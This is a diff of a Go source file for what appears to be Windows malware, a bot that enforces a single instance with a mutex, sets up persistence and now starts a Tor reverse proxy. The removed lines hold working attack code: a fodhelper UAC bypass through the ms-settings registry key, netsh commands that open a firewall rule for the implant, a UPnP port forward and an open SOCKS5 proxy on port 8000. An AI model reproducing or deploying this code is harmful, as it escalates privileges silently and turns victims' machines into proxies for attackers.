@@ -1,21 +1,15 @@
 package main
 
 import (
-	"context"
 	crand "crypto/rand"
 	"fmt"
 	"math"
 	"math/big"
 	"math/rand"
 	"os"
-	"os/exec"
 	"syscall"
 	"time"
 	"unsafe"
-
-	"github.com/NebulousLabs/go-upnp"
-	"github.com/armon/go-socks5"
-	"golang.org/x/sys/windows/registry"
 )
 
 func main() {
@@ -25,15 +19,10 @@ func main() {
 	if _, err := CreateMutex("iIIusi0n"); err != nil {
 		return
 	}
-	err := BypassFirewall()
-	if err != nil {
-		return
-	}
-	BypassNAT()
 
 	var config Config
 	var persistence Persistence
-	err = config.Init()
+	err := config.Init()
 	if err != nil {
 		os.Exit(0)
 	}
@@ -54,58 +43,6 @@ func main() {
 	}
 }
 
-func BypassFirewall() error {
-	filename, err := os.Executable()
-	if err != nil {
-		return err
-	}
-	err = UacBypass(`netsh advfirewall firewall delete rule name="_____p2p"`)
-	if err != nil {
-		return err
-	}
-	err = UacBypass(`netsh advfirewall firewall add rule name="_____p2p" dir=in program="` +
-		filename + `" profile=any action=allow`)
-	if err != nil {
-		return err
-	}
-	err = UacBypass("")
-	return err
-}
-
-func BypassNAT() {
-	ctx, cancel := context.WithTimeout(context.Background(), time.Hour)
-	defer cancel()
-	d, err := upnp.DiscoverCtx(ctx)
-	if err != nil {
-		return
-	}
-	err = d.Forward(8000, "socks5")
-	if err != nil {
-		return
-	}
-}
-
-func UacBypass(cmd string) error {
-	key, _, err := registry.CreateKey(registry.CURRENT_USER,
-		`Software\Classes\ms-settings\shell\open\command`, registry.QUERY_VALUE|registry.SET_VALUE)
-	if err != nil {
-		return err
-	}
-	if err := key.SetStringValue("DelegateExecute", ""); err != nil {
-		return err
-	}
-	if err := key.SetStringValue("", cmd); err != nil {
-		return err
-	}
-	if err := key.Close(); err != nil {
-		return err
-	}
-	ins := exec.Command("cmd", "fodhelper")
-	ins.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
-	err = ins.Run()
-	return err
-}
-
 func CreateMutex(name string) (uintptr, error) {
 	kernel32 := syscall.NewLazyDLL("kernel32.dll")
 	procCreateMutex := kernel32.NewProc("CreateMutexW")
@@ -122,36 +59,9 @@ func CreateMutex(name string) (uintptr, error) {
 	}
 }
 
-func SocksServer(config Config, ch chan bool) {
-	exit := false
-	go func() {
-		exit = <-ch
-	}()
-	for {
-		if exit {
-			return
-		}
-		conf := &socks5.Config{}
-		server, err := socks5.New(conf)
-		if err != nil {
-			time.Sleep(time.Second * 10)
-			continue
-		}
-
-		if err := server.ListenAndServe("tcp", "0.0.0.0:8000"); err != nil {
-			time.Sleep(time.Second * 10)
-			continue
-		}
-	}
-}
-
 func mainFunc(config Config) error {
-	ch := make(chan bool)
-	go SocksServer(config, ch)
-
+	InitTorReverseProxy(config)
 	var handler Handler
 	err := handler.Init(config)
-
-	ch <- true
 	return err
 }
